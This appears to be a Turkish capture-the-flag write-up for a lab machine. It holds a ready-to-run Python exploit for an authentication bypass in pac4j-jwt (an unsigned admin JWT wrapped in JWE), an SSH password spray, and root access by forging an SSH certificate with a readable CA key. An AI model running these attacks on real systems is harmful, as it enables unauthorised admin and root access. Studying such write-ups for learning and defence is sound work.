@@ -1,0 +1,221 @@
+## Keşif
+
+```bash
+nmap -sC -sV -p- --min-rate 5000 ip -oA full_scan
+```
+
+```
+PORT     STATE SERVICE
+22/tcp   open  tcpwrapped  OpenSSH 9.6p1
+8080/tcp open  tcpwrapped  Jetty
+                           X-Powered-By: pac4j-jwt/6.0.3
+```
+
+Sadece iki port açık: SSH (22) ve Jetty üzerinde çalışan bir web uygulaması (8080). HTTP header'ında `pac4j-jwt/6.0.3` dikkat çekiyor.
+
+---
+
+## Web Uygulaması Keşfi
+
+Port 8080'de "Principal Internal Platform" login sayfası karşılıyor. Kaynak koda bakınca `/static/js/app.js` dosyası görünüyor:
+
+```bash
+curl -s http://ip:8080/static/js/app.js
+```
+
+JS dosyası uygulamanın authentication akışını ve endpoint listesini açıkça paylaşıyor:
+
+```
+/api/auth/login     - Giriş
+/api/auth/jwks      - RSA public key
+/api/dashboard      - Dashboard
+/api/users          - Kullanıcı listesi
+/api/settings       - Ayarlar
+```
+
+Token yapısı da açıklanmış:
+- Tokenlar **JWE** ile şifreleniyor (RSA-OAEP-256 + A128GCM)
+- İç JWT **RS256** ile imzalanıyor
+- Public key `/api/auth/jwks`'den alınıyor
+
+JWKS endpoint'inden RSA public key'i çekiyorum:
+
+```bash
+curl -s http://ip:8080/api/auth/jwks | jq
+```
+
+```json
+{
+  "keys": [{
+    "kty": "RSA",
+    "e": "AQAB",
+    "kid": "enc-key-1",
+    "n": "lTh54vtBS1NAWrxA..."
+  }]
+}
+```
+
+Şifreleme anahtarı açık ama imzalama anahtarı yok. pac4j-jwt/6.0.3 versiyonu + JWE/JWS kombinasyonu = **CVE-2026-29000**.
+
+---
+
+## İlk Erişim — CVE-2026-29000
+
+### Açığın Mantığı
+
+pac4j-jwt 6.0.3'ün `JwtAuthenticator`'ında kritik bir hata var. Hem JWE (şifreleme) hem JWS (imzalama) doğrulaması yapılandırıldığında şu akış gerçekleşiyor:
+
+1. JWE token alınır ve RSA private key ile çözülür
+2. İçerideki payload'dan `toSignedJWT()` çağrılır
+3. Eğer iç payload `PlainJWT` ise (imzasız, `{"alg":"none"}`), `toSignedJWT()` **null** döner
+4. Kod `if (signedJWT != null)` kontrolü yapar
+5. `null` olduğunda imza doğrulaması **tamamen atlanır**
+
+Kısaca: Dışarıdaki JWE zarfı doğrulanıyor ama içerideki JWT'nin imzası kontrol edilmiyor. Sadece public key ile şifrelenmiş bir JWE içine imzasız admin JWT koyarsak sisteme admin olarak girebiliriz.
+
+### Exploit
+
+```bash
+pip install jwcrypto
+python3 jwt.py http://ip:8080
+```
+
+`jwt.py` içeriği:
+
+```python
+#!/usr/bin/env python3
+import json, time, base64, requests, sys
+from jwcrypto import jwk, jwe
+
+TARGET = sys.argv[1]
+
+def b64url_encode(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+# JWKS'den public key çek
+resp = requests.get(f"{TARGET}/api/auth/jwks")
+key_data = resp.json()['keys'][0]
+pub_key = jwk.JWK(**key_data)
+
+# PlainJWT oluştur (alg: none)
+now = int(time.time())
+header  = b64url_encode(json.dumps({"alg": "none"}).encode())
+payload = b64url_encode(json.dumps({
+    "sub": "admin", "role": "ROLE_ADMIN",
+    "iss": "principal-platform",
+    "iat": now, "exp": now + 3600
+}).encode())
+plain_jwt = f"{header}.{payload}."
+
+# PlainJWT'yi JWE içine sar
+jwe_token = jwe.JWE(
+    plain_jwt.encode(),
+    recipient=pub_key,
+    protected=json.dumps({
+        "alg": "RSA-OAEP-256", "enc": "A128GCM",
+        "kid": key_data['kid'], "cty": "JWT"
+    })
+)
+forged_token = jwe_token.serialize(compact=True)
+
+# Admin olarak endpoint'lere eriş
+headers = {"Authorization": f"Bearer {forged_token}"}
+print(requests.get(f"{TARGET}/api/dashboard", headers=headers).json())
+print(requests.get(f"{TARGET}/api/users", headers=headers).json())
+print(requests.get(f"{TARGET}/api/settings", headers=headers).json())
+```
+
+Çıktı:
+
+```
+[+] Authenticated as: admin (ROLE_ADMIN)
+
+Users:
+  - admin, svc-deploy, jthompson, amorales, bwright, kkumar, mwilson, lzhang
+
+Settings > security > encryptionKey: D3pl0y_$$H_Now42!
+```
+
+Dashboard'dan kullanıcı listesi ve `settings` endpoint'inden şifre elde ediyorum.
+
+---
+
+## SSH Erişimi — svc-deploy
+
+Kullanıcıları bir dosyaya kaydedip password spray yapıyorum:
+
+```bash
+nxc ssh ip -u users.txt -p '*'
+```
+
+```
+[+] svc-deploy:*  Linux - Shell access!
+```
+
+```bash
+sshpass -p '*' ssh svc-deploy@ip
+svc-deploy@principal:~$ cat user.txt
+*
+```
+
+---
+
+## Yetki Yükseltme — SSH CA Sertifika Sahteciliği
+
+### Keşif
+
+`svc-deploy` kullanıcısı `deployers` grubunda. Bu grup `/opt/principal/ssh/` dizinine erişebiliyor:
+
+```bash
+ls -la /opt/principal/ssh/
+```
+
+```
+-rw-r----- root deployers  README.txt
+-rw-r----- root deployers  ca          ← CA private key (okuyabiliyoruz!)
+-rw-r--r-- root root       ca.pub
+```
+
+`README.txt` diyor ki: *"Bu CA, sshd tarafından sertifika tabanlı kimlik doğrulama için güvenilir."*
+
+SSHD yapılandırması:
+
+```
+PubkeyAuthentication yes
+PasswordAuthentication yes
+PermitRootLogin prohibit-password
+TrustedUserCAKeys /opt/principal/ssh/ca.pub
+```
+
+### Açığın Mantığı
+
+`TrustedUserCAKeys` ayarlanmış ama `AuthorizedPrincipalsFile` **yok**. Bu durumda OpenSSH, CA tarafından imzalanmış herhangi bir sertifikayı kabul ediyor. Sertifikadaki `principal` alanı yalnızca giriş yapılmak istenen kullanıcı adıyla eşleşmek zorunda.
+
+`PermitRootLogin prohibit-password` şifre ile root girişini engelliyor, ama sertifika tabanlı girişe izin veriyor. CA private key'i elimizde olduğuna göre `principal=root` olan bir sertifika imzalayabiliriz.
+
+Foothold ile aynı mantık: Sistem kriptografik zarfı (CA imzası) doğruluyor ama zarfın içindeki kimlik bilgisini (principal) kontrol etmiyor.
+
+### Exploit
+
+```bash
+# Yeni key çifti oluştur
+ssh-keygen -t ed25519 -f /tmp/pwn -N ""
+
+# CA ile root principal'ı için imzala
+ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
+
+# Sertifikayı doğrula
+ssh-keygen -L -f /tmp/pwn-cert.pub
+# Principals: root ✓
+
+# Root olarak bağlan
+ssh -i /tmp/pwn root@localhost
+```
+
+```
+root@principal:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@principal:~# cat /root/root.txt
+*
+```
